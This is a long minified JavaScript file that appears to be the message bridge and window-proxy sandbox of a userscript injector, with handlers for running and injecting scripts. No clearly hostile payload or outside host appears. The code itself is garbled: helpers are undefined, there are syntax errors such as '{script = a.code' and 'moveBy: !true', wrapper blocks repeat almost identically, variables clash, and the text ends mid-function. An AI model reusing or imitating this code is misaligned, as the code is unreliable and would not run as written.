(() => {
    const e = typeof globalThis === "undefined" ? window : globalThis,
          t = window["lu3i4gnk.9pb"];
    const n = (() => {
        const n = [],
              o = (o, r) => {
                  const i = t.sendPrefix + no();
                  e[i] = r,
                  t.sendToId(o, i)
              }
              ,
              r = () => n.splice(0).forEach((t=>{
                  try {
                      t()
                  } catch (e) {
                      console.error(e)
                  }
              }
              )),
              i = {},
              s = e => {
                  let t = i;
                  return e.split(".").forEach((e=>{
                      t = t[e] = t[e] || {}
                  }
                  )),
                  t
              }
              ,
              a = (e,t)=>{
                  e && n.push((()=>{
                      try {
                          e()
                      } catch (e) {
                          t && t(e)
                      }
                  }
                  )),
                  1 === n.length && o("commid", {
                      id: t
                  })
              }
              ,
              l = (e,t)=>{
                  const n = Gt({});
                  return t ? ((e,t)=>{
                      Ht(gt(t), (t=>{
                          vt(n, t, Gt(e[t]))
                      }
                      ))
                  }
                  )(e, t) : Ht(gt(e), (t=>{
                      vt(n, t, Gt(e[t]))
                  }
                  )),
                  n
              }
              ;
        let u = null;
        const g = e=>{
            e !== u && (u && (clearTimeout(u),
            u = null),
            u = setTimeout((()=>{
                u = null,
                r()
            }
            ), e))
        }
        ;
        return t.setMessageListener((t=>{
            const {method: o, args: r} = t;
            if ("commid" === o)
                return a(null, r.id);
            if ("ack" === o)
                return g(0);
            if ("injectable" === o)
                return g(0);
            if ("injectableack" === o)
                return g(0);
            if ("setForeignAttr" === o)
                return g(0);
            if ("script" === o)
                return g(0);
            if ("port.message" === o)
                return g(0);
            if ("external.connect" === o)
                return g(0);
            if ("run" === o)
                return g(0)
        }
        )),
        {
            addEventListener: (e,t,n)=>{
                const o = e => {
                    e = e || {};
                    const r = (e=>e ? {
                        capture: e.capture,
                        once: e.once,
                        passive: e.passive
                    } : void 0
                    )(e);
                    t.addEventListener(e.type, n, r)
                }
                ;
                return a((()=>{
                    o(e)
                }
                ), (()=>{
                    console.error("failed to addEventListener", e, t)
                }
                )),
                o
            },
            setTimeout: (e,t)=>{
                const o = setTimeout(e, t);
                return a((()=>{
                    clearTimeout(o)
                }
                ), (()=>{
                    console.error("failed to setTimeout", e, t)
                }
                )),
                o
            },
            clearTimeout: e=>{
                clearTimeout(e),
                a(null, null)
            }
        }
    }
    )();
    const o = (()=>{
        const o = e => ({
            send: (t,n)=>{
                const r = Gt({
                    m: t,
                    a: n,
                    r: null
                });
                e.send("port.message", r)
            }
            ,
            switchId: t=>{
                const n = e.__proto__;
                delete e.__proto__,
                e.__proto__ = t.__proto__,
                delete t.__proto__,
                t.__proto__ = n
            }
            ,
            init: t=>{
                const n = () => {
                    e.cleanup()
                }
                ;
                e.once("cleanup", n),
                t && e.cleanup()
            }
            ,
            once: (t,n)=>{
                e.once(t, n)
            }
            ,
            setMessageListener: t=>{
                e.setMessageListener(t)
            }
            ,
            cleanup: ()=>{
                e.cleanup()
            }
        });
        let r;
        const i = (()=>{
            const n = {
                sendPrefix: "2C",
                listenPrefix: "2P"
            };
            return r ? r : (r = ((r = {
                bridges: {}
            })=>{
                const i = (e=>{
                    const o = (({sendPrefix: t,listenPrefix: n})=>{
                        const o = ((e,t)=>{
                            const n = (t=>{
                                const o = Gt({});
                                return {
                                    send: (r,i)=>{
                                        const s = Gt({
                                            m: r,
                                            a: i,
                                            r: null
                                        });
                                        e.send(t.sendPrefix, s)
                                    }
                                    ,
                                    once: (r,i)=>{
                                        const s = (e[t] = e[t] || []);
                                        s.push(i)
                                    }
                                    ,
                                    setMessageListener: e=>{
                                        o.sendPrefix = t.sendPrefix,
                                        o.listenPrefix = t.listenPrefix,
                                        o.listener = e
                                    }
                                    ,
                                    cleanup: ()=>{
                                        o.listener && delete o.listener
                                    }
                                }
                                ;
                                return t ? n(t) : o
                            }
                            )((e=>{
                                const t = (n,t)=>{
                                    const o = (r=>{
                                        const i = r => {
                                            let s = r;
                                            const a = o => {
                                                const l = gt(o);
                                                return {
                                                    send: (i,l)=>{
                                                        const c = Gt({
                                                            m: i,
                                                            a: l,
                                                            r: null
                                                        });
                                                        r.send(n.listenPrefix, c)
                                                    }
                                                    ,
                                                    once: (i,c)=>{
                                                        const u = (r[i] = r[i] || []);
                                                        u.push(c)
                                                    }
                                                    ,
                                                    setMessageListener: r=>{
                                                        s = r
                                                    }
                                                    ,
                                                    cleanup: ()=>{
                                                        s && delete s
                                                    }
                                                }
                                            }
                                            ;
                                            return r ? i(r) : a
                                        }
                                        )((e=>{
                                            const o = {};
                                            return e.listen && (o.listener = e.listen),
                                            e.receive && (o.messageListener = e.receive),
                                            o
                                        }
                                        )(n));
                                        return i.listener ? (r.once(n.listenPrefix, s=>{
                                            const a = t(s);
                                            try {
                                                i.listener(a)
                                            } catch (e) {
                                                console.error(e)
                                            }
                                        }
                                        ),
                                        r.once(n.listenPrefix, (()=>{
                                            const e = s=>{
                                                if (i.messageListener) {
                                                    const e = t(s);
                                                    try {
                                                        i.messageListener(e)
                                                    } catch (e) {
                                                        console.error(e)
                                                    }
                                                }
                                            }
                                            ;
                                            return e
                                        }
                                        )())) : (r.once(n.listenPrefix, (()=>{
                                            const e = s=>{
                                                if (i.messageListener) {
                                                    const e = t(s);
                                                    try {
                                                        i.messageListener(e)
                                                    } catch (e) {
                                                        console.error(e)
                                                    }
                                                }
                                            }
                                            ;
                                            return e
                                        }
                                        )()),
                                        r.once(n.listenPrefix, s=>{
                                            const a = t(s);
                                            try {
                                                i.listener(a)
                                            } catch (e) {
                                                console.error(e)
                                            }
                                        }
                                        )),
                                        i.cleanup = (()=>{
                                            r.cleanup(),
                                            delete i.listener,
                                            delete i.messageListener,
                                            delete i.cleanup
                                        }
                                        ),
                                        i
                                    }
                                    ;
                                    return t ? t : o
                                }
                                )((e=>{
                                    const t = {};
                                    return e.send && (t.send = e.send),
                                    e.once && (t.once = e.once),
                                    e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                                    t
                                }
                                )(t));
                                return o
                            }
                            )(t);
                            let r = null;
                            const i = ((e,t)=>{
                                const n = Gt({});
                                Ht(gt(t), (t=>{
                                    vt(n, t, Gt(e[t]))
                                }
                                ));
                                const o = {
                                    send: (e,t)=>{
                                        const r = Gt({
                                            m: e,
                                            a: t,
                                            r: null
                                        });
                                        n.send(t.sendPrefix, r)
                                    }
                                    ,
                                    once: (e,t)=>{
                                        n.once(t.listenPrefix, (n=>{
                                            t.once(e, n)
                                        }
                                        ))
                                    }
                                    ,
                                    setMessageListener: e=>{
                                        n.setMessageListener((t=>{
                                            const n = t.m
                                              , o = t.a
                                              , r = t.r;
                                            "ack" === n ? (e(null, o),
                                            r && r()) : e({
                                                method: n,
                                                args: o
                                            })
                                        }
                                        ))
                                    }
                                    ,
                                    cleanup: ()=>{
                                        n.cleanup(),
                                        r && r()
                                    }
                                };
                                return o
                            }
                            )({
                                sendPrefix: e.sendPrefix,
                                listenPrefix: e.listenPrefix
                            }, o);
                            const s = {
                                send: (e,t)=>{
                                    i.send(e, t)
                                }
                                ,
                                once: (e,t)=>{
                                    i.once(e, t)
                                }
                                ,
                                setMessageListener: e=>{
                                    i.setMessageListener(e)
                                }
                                ,
                                cleanup: ()=>{
                                    i.cleanup()
                                }
                            };
                            return s
                        }
                        )((e=>{
                            const t = {};
                            return e.send && (t.send = e.send),
                            e.once && (t.once = e.once),
                            e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                            t
                        }
                        )(e));
                        return o
                    }
                    )({
                        sendPrefix: t.sendPrefix,
                        listenPrefix: t.listenPrefix
                    });
                    let r = null;
                    const i = ((t,n)=>{
                        const o = Gt({});
                        Ht(gt(n), (t=>{
                            vt(o, t, Gt(e[t]))
                        }
                        ));
                        const r = {
                            send: (e,t)=>{
                                const i = Gt({
                                    m: e,
                                    a: t,
                                    r: null
                                });
                                o.send(n.sendPrefix, i)
                            }
                            ,
                            once: (e,t)=>{
                                o.once(n.listenPrefix, (n=>{
                                    t.once(e, n)
                                }
                                ))
                            }
                            ,
                            setMessageListener: e=>{
                                o.setMessageListener((t=>{
                                    const o = t.m
                                      , r = t.a;
                                    "ack" === o ? e(null, r) : e({
                                        method: o,
                                        args: r
                                    })
                                }
                                ))
                            }
                            ,
                            cleanup: ()=>{
                                o.cleanup(),
                                r && r()
                            }
                        };
                        return r
                    }
                    )({
                        sendPrefix: e.sendPrefix,
                        listenPrefix: e.listenPrefix
                    }, o);
                    const s = {
                        send: (e,t)=>{
                            i.send(e, t)
                        }
                        ,
                        once: (e,t)=>{
                            i.once(e, t)
                        }
                        ,
                        setMessageListener: e=>{
                            i.setMessageListener(e)
                        }
                        ,
                        cleanup: ()=>{
                            i.cleanup()
                        }
                    };
                    return s
                }
                )((e=>{
                    const t = {};
                    return e.send && (t.send = e.send),
                    e.once && (t.once = e.once),
                    e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                    t
                }
                )(e));
                return o
            }
            )({
                sendPrefix: "2C",
                listenPrefix: "2P"
            }),
            r.bridges.first = o;
            const s = (()=>{
                const n = (e=>{
                    let t = Gt({});
                    const n = (e,o,r)=>{
                        const i = bt(e);
                        i && i === o || (null != i && --r >= 0 && n(i, e, r),
                        t = mt(t, ht(e)))
                    }
                    ;
                    return n(e, null, 5),
                    t
                }
                )(e);
                Ht(mo, (e=>delete n[e]));
                const o = n;
                return Gt({
                    createProxy: n=>{
                        let r = o;
                        const i = e=>{
                            let t, n;
                            const o = (t = Mt(s, e)) || (n = r[e]);
                            return Gt({
                                d: o ? Gt(o) : o,
                                l: !!t,
                                w: !!n
                            })
                        }
                          , a = e=>{
                            if (!l(e))
                                return !1;
                            if ("length" === e)
                                return !0;
                            const t = wt($n(e));
                            return t >= 0 && t <= rn && e === `${t}`
                        }
                          , u = e=>"on" === mn(e, 0, 2)
                          , g = (e,t)=>{
                            const n = mn(e, 2)
                              , o = d[n];
                            if (o && (t.removeEventListener(n, o),
                            delete d[n]),
                            t && (e=>"function" == typeof e)(t)) {
                                const e = (...e)=>Rt(t, s, e);
                                t.addEventListener(n, e),
                                d[n] = e
                            }
                        }
                          , p = t=>void 0 !== t && (t === e || t === zn || t === Yn)
                          , m = Gt({
                            addEventListener: !0,
                            alert: !0,
                            atob: !0,
                            blur: !0,
                            btoa: !0,
                            cancelAnimationFrame: !0,
                            cancelIdleCallback: !0,
                            captureEvents: !0,
                            clearInterval: !0,
                            clearTimeout: !0,
                            close: !0,
                            confirm: !0,
                            createImageBitmap: !0,
                            dispatchEvent: !0,
                            dump: !0,
                            fetch: !0,
                            find: !0,
                            focus: !0,
                            getComputedStyle: !0,
                            getDefaultComputedStyle: !0,
                            getSelection: !0,
                            matchMedia: !0,
                            moveBy: !true,
                            moveTo: !0,
                            open: !0,
                            openDatabase: !0,
                            postMessage: !0,
                            print: !0,
                            prompt: !0,
                            queueMicrotask: !0,
                            releaseEvents: !0,
                            removeEventListener: !0,
                            reportError: !0,
                            requestAnimationFrame: !0,
                            requestIdleCallback: !0,
                            resizeBy: !0,
                            resizeTo: !0,
                            scroll: !0,
                            scrollBy: !0,
                            scrollByLines: !0,
                            scrollByPages: !0,
                            scrollTo: !0,
                            setInterval: !0,
                            setResizable: !0,
                            setTimeout: !0,
                            showDirectoryPicker: !0,
                            sizeToContent: !0,
                            stop: !0,
                            structuredClone: !0,
                            updateCommands: !0,
                            webkitCancelAnimationFrame: !0,
                            webkitRequestAnimationFrame: !0,
                            webkitRequestFileSystem: !0,
                            webkitResolveLocalFileSystemURL: !0
                        });
                        Ht(gt(m), (e=>{
                            s[e] = s[e] || Gt({
                                bind: !0
                            })
                        }
                        ));
                        const d = Gt({})
                          , f = Gt({});
                        Lt(f, hn, "Window");
                        const v = new Un(f,Gt({
                            defineProperty: (e,t,o)=>{
                                const {d: r, l: d} = i(t)
                                  , u = Gt(o);
                                return r && !r.configurable && (!!r.configurable != !!u.configurable || !!r.enumerable != !!r.enumerable) || a(t) ? (vt(d ? f : zn, t, u),
                                !1) : (vt(f, t, u),
                                l(t) && u && u.configurable && u.writable && u.value && "function" == typeof u.value && !p(u.value) && (u.value = Gt(u.value)),
                                l(t) && u && !u.configurable && "function" == typeof u.get && !p(u.get) && (u.get = Gt(u.get)),
                                l(t) && u && !u.configurable && "function" == typeof u.set && !p(u.set) && (u.set = Gt(u.set)),
                                delete s[t],
                                !0)
                            }
                            ,
                            deleteProperty: (e,t)=>{
                                let {d: a, l: d, w: u} = i(t);
                                return !(!a || !a.configurable) && (d && (d = delete f[t],
                                l(t) && d && "function" == typeof a && u && g(t, a)),
                                (u || (a = r[t]) && a.configurable) && (o === r && (r = mt(Gt({}), o)),
                                u = delete r[t]),
                                delete s[t],
                                d || u)
                            }
                            ,
                            get: (e,t)=>{
                                const o = s[t];
                                if (o) {
                                    if (o.once && delete s[t],
                                    "value"in o)
                                        return o.value;
                                    if (o.get)
                                        return o.get()
                                }
                                const {d: r} = a(t) ? Gt({
                                    d: Mt(zn, t),
                                    l: !1
                                }) : i(t);
                                if (r) {
                                    let e;
                                    const n = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                    return n && o && o.bind ? Gt(n) : n
                                }
                            }
                            ,
                            getOwnPropertyDescriptor: (e,t)=>{
                                let {d: o, l: r} = i(t);
                                if (!o) {
                                    const e = s[t];
                                    if (e)
                                        return Gt({
                                            enumerable: !0,
                                            configurable: !0,
                                            writable: !0,
                                            value: e.value,
                                            set: e.set,
                                            get: e.get
                                        });
                                    if (!a(t))
                                        return;
                                    o = Mt(zn, t),
                                    r = !1
                                }
                                const d = mt(Gt({}), o);
                                if (!r) {
                                    const e = d.get;
                                    e && (d.get = ()=>{
                                        const t = e();
                                        return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                    }
                                    ),
                                    d && !d.configurable && vt(f, t, d)
                                }
                                return d
                            }
                            ,
                            has: (e,t)=>t in f || t in s || t in r,
                            ownKeys: ()=>{
                                const e = e=>!(e in r)
                                  , t = gt(r)
                                  , n = Ft(gt(ht(f)), e)
                                  , o = Gt({});
                                for (let e = 0; "Window" === Zt(Ot(zn, e)); e += 1)
                                    o[e] = !0;
                                const s = Ft(gt(o), e);
                                return qt(t, n, s)
                            }
                            ,
                            preventExtensions: ()=>!0,
                            set: (e,t,o)=>{
                                const r = s[t];
                                if (r && r.set)
                                    return r.set(o),
                                    !0;
                                const {d} = i(t);
                                return !(d && !d.writable && !It(d, "set") || a(t) || (delete s[t],
                                vt(f, t, o),
                                l(t) && o && o.configurable && o.writable && o.value && "function" == typeof o.value && !p(o.value) && (o.value = Gt(o.value)),
                                l(t) && o && !o.configurable && "function" == typeof o.get && !p(o.get) && (o.get = Gt(o.get)),
                                l(t) && o && !o.configurable && "function" == typeof o.set && !p(o.set) && (o.set = Gt(o.set)),
                                0))
                            }
                        }));
                        return v
                    }
                }
                )({
                    sendPrefix: "2C",
                    listenPrefix: "2P"
                })),
                e.bridges.first = s;
                const c = mt(e.console, io);
                s.init(n);
                const d = Gt({});
                s.setMessageListener((({method: t, args: n})=>{
                    if ("commid" == t)
                        s.switchId(n.id),
                        s.send("ack", Gt({
                            id: n.id
                        }));
                    else if ("injectable" == t)
                        g(n.id, (()=>{
                            s.send("ack", Gt({
                                id: n.id
                            }))
                        }
                        )),
                        s.send("injectableack", Gt({
                            id: n.id
                        }));
                    else if ("setForeignAttr" == t)
                        zn[n.attr] = n.value;
                    else if ("script" == t) {
                        const {id: t, unwrap: r, bundle: a} = n
                          , {script = a.code
                          , {map: l, sourceMappingUrl: u} = a
                          , {url: g, version: p} = r;
                        try {
                            const t = io(g, p);
                            if (t) {
                                const {transpiledCode: r, sourceMappingUrl: a, map: l} = t;
                                s.send("ack", Gt({
                                    id: n.id
                                })),
                                s.send("scriptack", Gt({
                                    id: n.id,
                                    result: Gt({
                                        code: r,
                                        sourceMappingUrl: a,
                                        map: l
                                    })
                                }))
                            } else
                                s.send("ack", Gt({
                                    id: n.id
                                })),
                                s.send("scriptack", Gt({
                                    id: n.id,
                                    result: null
                                }))
                        } catch (e) {
                            s.send("ack", Gt({
                                id: n.id
                            })),
                            s.send("scriptack", Gt({
                                id: n.id,
                                error: Gt({
                                    message: e.message,
                                    stack: e.stack
                                })
                            }))
                        }
                    } else if ("port.message" == t) {
                        const {id: t, result: r} = n
                          , {type: a, data: l} = r;
                        "event" == a ? o.emit(t, l) : "promise" == a ? d[t] && (d[t](l),
                        delete d[t]) : "callback" == a && (d[t] && d[t](l),
                        delete d[t])
                    } else if ("external.connect" == t) {
                        const {id: t, port: r} = n
                          , {on: a, once: l, send: u, cleanup: g} = o.createProxy(r);
                        s.send("ack", Gt({
                            id: t
                        })),
                        s.send("external.connectack", Gt({
                            id: t
                        })),
                        s.send("port.message", Gt({
                            id: t,
                            result: Gt({
                                on: a,
                                once: l,
                                send: u,
                                cleanup: (()=>{
                                    g(),
                                    s.send("port.message", Gt({
                                        id: t,
                                        result: Gt(null)
                                    }))
                                }
                                )
                            })
                        }))
                    } else
                        "run" == t && (({id: t, code: r})=>{
                            try {
                                const a = io(null, null);
                                if (!a)
                                    return void s.send("ack", Gt({
                                        id: t
                                    }));
                                const l = new Un(a,vo);
                                l.once("ack", (()=>{
                                    const {send: a, once: u} = o.createProxy(l);
                                    u("result", (()=>{
                                        s.send("ack", Gt({
                                            id: t
                                        })),
                                        l.cleanup()
                                    }
                                    )),
                                    a("run", r)
                                }
                                )),
                                s.send("ack", Gt({
                                    id: t
                                }))
                            } catch (e) {
                                s.send("ack", Gt({
                                    id: t
                                })),
                                s.send("error", Gt({
                                    id: t,
                                    error: Gt({
                                        message: e.message,
                                        stack: e.stack
                                    })
                                }))
                            }
                        }
                        )(n)
                }
                )),
                o.once("cleanup", (()=>{
                    s.cleanup()
                }
                )),
                o.emit("ready"),
                {
                    cleanup: ()=>{
                        s.cleanup(),
                        o.cleanup()
                    }
                }
            }
            )(e.__proto__);
            const a = {
                createProxy: o=>c.createProxy(o)
            };
            return a
        }
        )(),
        i = (()=>{
            const n = {
                sendPrefix: "2P",
                listenPrefix: "2C"
            };
            return r ? r : (r = ((r = {
                bridges: {}
            })=>{
                const i = (({sendPrefix: t,listenPrefix: n})=>{
                    const o = ((e,t)=>{
                        const n = (t=>{
                            const o = Gt({});
                            return {
                                send: (r,i)=>{
                                    const s = Gt({
                                        m: r,
                                        a: i,
                                        r: null
                                    });
                                    e.send(t.sendPrefix, s)
                                }
                                ,
                                once: (r,i)=>{
                                    const s = (e[r] = e[r] || []);
                                    s.push(i)
                                }
                                ,
                                setMessageListener: e=>{
                                    o.sendPrefix = t.sendPrefix,
                                    o.listenPrefix = t.listenPrefix,
                                    o.listener = e
                                }
                                ,
                                cleanup: ()=>{
                                    o.listener && delete o.listener
                                }
                            }
                            ;
                            return t ? n(t) : o
                        }
                        )((e=>{
                            const o = {};
                            return e.send && (o.send = e.send),
                            e.once && (o.once = e.once),
                            e.setMessageListener && (o.setMessageListener = e.setMessageListener),
                            o
                        }
                        )(t));
                        return o
                    }
                    )((e=>{
                        const t = {};
                        return e.send && (t.send = e.send),
                        e.once && (t.once = e.once),
                        e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                        t
                    }
                    )(e));
                    let r = null;
                    const i = ((e,t)=>{
                        const n = Gt({});
                        Ht(gt(t), (t=>{
                            vt(n, t, Gt(e[t]))
                        }
                        ));
                        const o = {
                            send: (e,t)=>{
                                const r = Gt({
                                    m: e,
                                    a: t,
                                    r: null
                                });
                                n.send(t.sendPrefix, r)
                            }
                            ,
                            once: (e,t)=>{
                                n.once(t.listenPrefix, (n=>{
                                    t.once(e, n)
                                }
                                ))
                            }
                            ,
                            setMessageListener: e=>{
                                n.setMessageListener((t=>{
                                    const o = t.m
                                      , r = t.a;
                                    "ack" === o ? e(null, r) : e({
                                        method: o,
                                        args: r
                                    })
                                }
                                ))
                            }
                            ,
                            cleanup: ()=>{
                                n.cleanup(),
                                r && r()
                            }
                        };
                        return o
                    }
                    )({
                        sendPrefix: e.sendPrefix,
                        listenPrefix: e.listenPrefix
                    }, o);
                    const s = {
                        send: (e,t)=>{
                            i.send(e, t)
                        }
                        ,
                        once: (e,t)=>{
                            i.once(e, t)
                        }
                        ,
                        setMessageListener: e=>{
                            i.setMessageListener(e)
                        }
                        ,
                        cleanup: ()=>{
                            i.cleanup()
                        }
                    };
                    return s
                }
                )({
                    sendPrefix: n.sendPrefix,
                    listenPrefix: n.listenPrefix
                });
                let s = null;
                const a = ((t,n)=>{
                    const o = Gt({});
                    Ht(gt(n), (t=>{
                        vt(o, t, Gt(e[t]))
                    }
                    ));
                    const r = {
                        send: (e,t)=>{
                            const s = Gt({
                                m: e,
                                a: t,
                                r: null
                            });
                            o.send(n.sendPrefix, s)
                        }
                        ,
                        once: (e,t)=>{
                            o.once(t.listenPrefix, (n=>{
                                t.once(e, n)
                            }
                            ))
                        }
                        ,
                        setMessageListener: e=>{
                            o.setMessageListener((t=>{
                                const o = t.m
                                  , r = t.a;
                                "ack" === o ? e(null, r) : e({
                                    method: o,
                                    args: r
                                })
                            }
                            ))
                        }
                        ,
                        cleanup: ()=>{
                            o.cleanup(),
                            s && s()
                        }
                    };
                    return r
                }
                )({
                    sendPrefix: t.sendPrefix,
                    listenPrefix: t.listenPrefix
                }, o);
                const l = {
                    send: (e,t)=>{
                        a.send(e, t)
                    }
                    ,
                    once: (e,t)=>{
                        a.once(e, t)
                    }
                    ,
                    setMessageListener: e=>{
                        a.setMessageListener(e)
                    }
                    ,
                    cleanup: ()=>{
                        a.cleanup()
                    }
                };
                return l
            }
            )((e=>{
                const t = {};
                return e.send && (t.send = e.send),
                e.once && (t.once = e.once),
                e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                t
            }
            )(e));
            return Gt({
                createProxy: e=>{
                    let t = r;
                    const n = e=>{
                        let o, n;
                        const r = (o = Nt(t, e)) || (n = Nt(s, e));
                        return Gt({
                            d: r ? Gt(r) : r,
                            l: !!o,
                            w: !!n
                        })
                    }
                      , o = e=>{
                        if (!l(e))
                            return !1;
                        if ("length" === e)
                            return !0;
                        const t = wt($n(e));
                        return t >= 0 && t <= rn && e === `${t}`
                    }
                      , r = e=>"on" === mn(e, 0, 2)
                      , i = (e,t)=>{
                        const n = mn(e, 2)
                          , o = d[n];
                        if (o && (t.removeEventListener(n, o),
                        delete d[n]),
                        t && (e=>"function" == typeof e)(t)) {
                            const e = (...e)=>Rt(t, s, e);
                            t.addEventListener(n, e),
                            d[n] = e
                        }
                    }
                      , s = Gt({})
                      , a = Gt({})
                      , u = new Un(a,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = n(t)
                              , i = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!i.configurable || !!o.enumerable != !!o.enumerable) || o && a[t] || o && o.get && !o.set ? (vt(r ? a : s, t, i),
                            !1) : (vt(a, t, i),
                            l(t) && i && i.configurable && i.writable && i.value && "function" == typeof i.value && !p(i.value) && (i.value = Gt(i.value)),
                            l(t) && i && !i.configurable && "function" == typeof i.get && !p(i.get) && (i.get = Gt(i.get)),
                            l(t) && i && !i.configurable && "function" == typeof i.set && !p(i.set) && (i.set = Gt(i.set)),
                            delete r[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = a[t];
                            return !(!n || !n.configurable) && (o && (o = delete s[t],
                            l(t) && o && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete a[t]),
                            delete s[t],
                            o || r)
                        }
                        ,
                        get: (e,n)=>{
                            const o = s[n];
                            if (o) {
                                if (o.once && delete s[n],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = a[n];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,n)=>{
                            let {d: o, l: r} = a[n];
                            if (!o) {
                                const e = s[n];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!l(n))
                                    return;
                                o = Nt(e, n),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = e.__proto__),
                                    Gt(t)
                                }
                                )
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in s || t in a,
                        ownKeys: ()=>{
                            const e = e=>!(e in o)
                              , t = gt(o)
                              , n = Ft(gt(ht(s)), e)
                              , r = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(a, e)); e += 1)
                                r[e] = !0;
                            const i = Ft(gt(r), e);
                            return qt(t, n, i)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,n,o)=>{
                            const r = s[n];
                            if (r && r.set)
                                return r.set(o),
                                !0;
                            const {d} = a[n];
                            return !(d && !d.writable && !It(d, "set") || l(n) || (delete s[n],
                            vt(a, n, o),
                            l(n) && o && o.configurable && o.writable && o.value && "function" == typeof o.value && !p(o.value) && (o.value = Gt(o.value)),
                            l(n) && o && !o.configurable && "function" == typeof o.get && !p(o.get) && (o.get = Gt(o.get)),
                            l(n) && o && !o.configurable && "function" == typeof o.set && !p(o.set) && (o.set = Gt(o.set)),
0))
                        }
                    });
                    Ht(gt(u), (e=>{
                        s[e] = s[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const f = new Un(d,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            l(t) && s && s.configurable && s.writable && s.value && "function" == typeof s.value && !p(s.value) && (s.value = Gt(s.value)),
                            l(t) && s && !s.configurable && "function" == typeof s.get && !p(s.get) && (s.get = Gt(s.get)),
                            l(t) && s && !s.configurable && "function" == typeof s.set && !p(s.set) && (s.set = Gt(s.set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            l(t) && o && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!l(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || l(t) || (delete zn[t],
                            vt(d, t, n),
                            l(t) && n && n.configurable && n.writable && n.value && "function" == typeof n.value && !p(n.value) && (n.value = Gt(n.value)),
                            l(t) && n && !n.configurable && "function" == typeof n.get && !p(n.get) && (n.get = Gt(n.get)),
                            l(t) && n && !n.configurable && "function" == typeof n.set && !p(n.set) && (n.set = Gt(n.set)),
                            0))
                        }
                    }));
                    return f
                }
                )({
                    sendPrefix: n.sendPrefix,
                    listenPrefix: n.listenPrefix
                });
                let s = null;
                const a = ((t,n)=>{
                    const o = Gt({});
                    Ht(gt(n), (t=>{
                        vt(o, t, Gt(e[t]))
                    }
                    ));
                    const r = {
                        send: (e,t)=>{
                            const s = Gt({
                                m: e,
                                a: t,
                                r: null
                            });
                            o.send(n.sendPrefix, s)
                        }
                        ,
                        once: (e,t)=>{
                            o.once(n.listenPrefix, (n=>{
                                t.once(e, n)
                            }
                            ))
                        }
                        ,
                        setMessageListener: e=>{
                            o.setMessageListener((t=>{
                                const o = t.m
                                  , r = t.a;
                                "ack" === o ? e(null, r) : e({
                                    method: o,
                                    args: r
                                })
                            }
                            ))
                        }
                        ,
                        cleanup: ()=>{
                            o.cleanup(),
                            s && s()
                        }
                    };
                    return r
                }
                )({
                    sendPrefix: t.sendPrefix,
                    listenPrefix: t.listenPrefix
                }, i);
                const l = {
                    send: (e,t)=>{
                        a.send(e, t)
                    }
                    ,
                    once: (e,t)=>{
                        a.once(e, t)
                    }
                    ,
                    setMessageListener: e=>{
